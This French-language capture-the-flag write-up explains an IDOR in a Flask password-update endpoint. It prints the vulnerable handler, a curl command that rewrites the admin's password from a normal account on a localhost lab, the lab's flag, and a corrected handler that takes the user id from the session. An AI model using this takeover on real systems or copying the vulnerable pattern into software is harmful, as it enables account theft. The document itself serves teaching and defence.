Prise de contrôle de compte via une IDOR sur la mise à jour du mot de passe

L’endpoint de mise à jour du mot de passe lit deux valeurs depuis le corps de la requête — l’identifiant de l’utilisateur cible et l’ancien mot de passe — et fait confiance aux deux. La vérification de l’ancien mot de passe est faite contre l’utilisateur de la session, mais le nouveau mot de passe est ensuite écrit pour l’id reçu dans le corps. Un utilisateur normal peut changer le mot de passe de n’importe qui.

Rappel rapide — IDOR

Une IDOR (Insecure Direct Object Reference) apparaît quand un endpoint agit sur un identifiant fourni par le client sans vérifier que l’appelant a le droit d’agir sur cet objet.

Dans ce lab l’impact est une prise de contrôle complète de compte : l’utilisateur normal réécrit le mot de passe de l’admin, puis se connecte en tant qu’admin pour lire un secret réservé.

D’où vient la vulnérabilité

Le handler valide old contre l’utilisateur de la session, mais écrit pour l’uid reçu dans le corps. C’est cette dissociation qui crée le bug.

@app.route("/update_password", methods=["POST"])
def update_password():
    data = request.get_json(silent=True) or {}
    uid = int(data.get("id", 0) or request.form.get("id", 0))
    old = data.get("old") or request.form.get("old")
    new = data.get("new") or request.form.get("new")
    cu = current_user()
    if cu and cu["password"] == old and uid in users:
        users[uid]["password"] = new
        return ...

Le formulaire HTML envoie un champ caché id égal à l’utilisateur de la session. Les champs cachés sont contrôlés par l’utilisateur — tout ce que le navigateur envoie peut être édité par un attaquant.

Exploitation

Connecte-toi en tant qu’utilisateur normal, puis soumets le formulaire de changement de mot de passe avec id=1 (l’admin) et ton propre mot de passe actuel comme old.

Connexion en utilisateur normal

username=user
password=user123

Prise de contrôle de l’admin

curl -i http://localhost:5010/update_password \
  -b cookies.txt \
  --data "id=1&old=user123&new=pwn3d"

Déconnecte-toi, reconnecte-toi en admin avec le nouveau mot de passe, puis visite /admin/secrets.

Flag

ID0R_PWN3D_TH3_4DM1N

Le correctif

Ne jamais accepter l’identifiant utilisateur depuis le corps de la requête quand l’action concerne la propre ressource de l’appelant. On le récupère depuis la session.

@app.route("/update_password", methods=["POST"])
def update_password():
    cu = current_user()
    if not cu:
        return redirect(url_for("index"))
    old = request.form.get("old")
    new = request.form.get("new")
    if cu["password"] != old:
        return "forbidden", 403
    users[cu["id"]]["password"] = new
    # en production, on stocke le mot de passe haché
    return redirect(url_for("profile"))

Deux règles à garder en tête :

  • La session est la source de vérité de « qui agit » — jamais le corps de la requête.
  • Si un endpoint doit accepter un id cible (par ex. un admin qui agit sur quelqu’un d’autre), on vérifie que l’appelant a le droit d’agir sur cette cible.
